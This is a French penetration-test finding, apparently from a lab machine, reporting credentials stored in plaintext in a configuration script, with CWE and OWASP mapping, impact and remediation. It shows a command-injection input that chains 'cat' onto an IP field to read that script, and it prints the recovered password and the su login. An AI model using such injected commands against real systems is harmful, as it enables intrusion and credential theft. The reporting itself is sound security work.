# VULN-02 — Information Disclosure (credentials en clair)

**Sévérité :** MOYEN (CVSS 5.1)
**OWASP :** A02:2021 Cryptographic Failures
**CWE :** CWE-256 Plaintext Storage of Sensitive Information
**Vecteur :** /run/john-script.sh (accessible via VULN-01)

---

## Description

Un script de configuration automatique stocke les identifiants de connexion de l'utilisateur John en clair dans un fichier texte. Ce fichier était accessible depuis le contexte www-data via la RCE (VULN-01), grâce à l'appartenance commune au groupe secretgroup (VULN-05).

---

## Découverte

Via la RCE (VULN-01), lecture du script de configuration :

```
10.10.10.83 && cat /run/john-script.sh
```

---

## Exploitation

Résultat :

```bash
#!/bin/bash

USERNAME="john"
PASSWD="peterpan"

sshpass -p $PASSWD ssh $USERNAME@127.0.0.1 'echo "Testing sshpass tool. It is awesome !!" > ~/sshpass.txt'
```

Credentials récupérés directement :
* Login : `john`
* Mot de passe : `peterpan`

Connexion au compte John depuis Alice :

```bash
alice@server:~$ su john
Password: peterpan
john@server:~$
```

---

## Impact

Compromission directe du compte John sans outil de bruteforce. Ce compte est le pivot vers les escalades de privilèges VULN-06 (crontab wildcard) et VULN-07 (sudoers). Le mot de passe "peterpan" est trivial et aurait pu être craqué en secondes même s'il avait été hashé.

**Impact GRC :** Violation CWE-256 et NIST 800-63B (politique de mots de passe). Contrôle A.8.24 ISO 27001:2022 non respecté.

---

## Remédiation

Ne jamais stocker de credentials en clair dans un script. Utiliser HashiCorp Vault, des variables d'environnement chiffrées, ou des secrets managers cloud. Rotation immédiate du mot de passe compromis.

---

## Références

* [CWE-256](https://cwe.mitre.org/data/definitions/256.html)
* [NIST 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)
* [HashiCorp Vault](https://www.vaultproject.io/)

**MITRE ATT&CK :** T1552.001 Credentials in Files
